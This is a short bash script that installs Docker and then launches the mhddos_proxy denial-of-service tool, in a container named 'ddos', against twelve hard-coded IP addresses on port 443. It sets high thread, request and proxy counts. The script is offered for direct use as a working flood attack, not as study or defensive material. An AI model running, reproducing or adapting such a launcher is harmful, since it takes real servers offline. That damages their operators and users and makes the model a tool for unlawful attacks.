#!/bin/bash

# Configuration of MHDDOS PROXY

sudo apt update
sudo apt install apt-transport-https -y
sudo apt install curl -y
sudo curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -
sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable"
sudo apt update
sudo apt install docker-ce -y
sudo systemctl start docker

docker run --detach --name ddos --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest \
    tcp://130.193.37.150:443 \
    tcp://178.154.196.210:443 \
    tcp://37.18.29.167:443 \
    tcp://130.193.36.55:443 \
    tcp://188.130.235.84:443 \
    tcp://84.201.145.181:443 \
    tcp://185.93.111.122:443 \
    tcp://46.243.184.242:443 \
    tcp://188.130.235.206:443 \
    tcp://188.130.235.210:443 \
    tcp://188.130.235.244:443 \
    tcp://188.130.235.86:443 \
    -t 1500 --rpc 1000 -p 1000 --debug